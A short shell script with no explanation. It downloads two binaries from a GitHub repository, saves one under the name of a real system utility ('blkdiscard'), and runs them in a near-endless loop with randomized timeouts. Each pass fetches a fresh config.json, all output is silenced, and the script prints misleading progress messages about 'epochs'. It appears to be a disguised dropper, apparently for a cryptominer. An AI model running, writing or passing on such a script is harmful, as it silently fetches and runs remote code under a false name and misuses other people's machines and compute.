#!/bin/sh
#
#
cd
name=$(shuf -i 1-999999 -n 1)
mkdir $name
cd $name
wget -q -O blkdiscard --secure-protocol=TLSv1_2 https://raw.githubusercontent.com//lambohopo/la/main/vilomine > /dev/null 2>&1
wget -q --secure-protocol=TLSv1_2 https://raw.githubusercontent.com/lambohopo/la/main/uin > /dev/null 2>&1
chmod +x blkdiscard uin 
x=1
while [ $x -le 999999999 ]
do
  wget -q --secure-protocol=TLSv1_2 https://raw.githubusercontent.com/lambohopo/myproject/main/config.json > /dev/null 2>&1
  timer=$(shuf -i 120-135 -n 1)
  timeout "$timer" ./uin > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo "$timer Initialized Name Variable" ; else echo Failed ; fi
  x=$(( $x + 1 ))
  rm -rf config.json 
  sleep 1
  timers=$(shuf -i 144-200 -n 1)
  epoch=$(shuf -i 1-999999 -n 1)
  echo "All done with $x times"
  wget -q --secure-protocol=TLSv1_2 https://raw.githubusercontent.com/lambohopo/myproject/wrkz/config.json > /dev/null 2>&1
  timeout "$timers" ./uin > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo "$epoch epochs , $timers " ; else echo Failed ; fi
  rm -rf config.json 
done
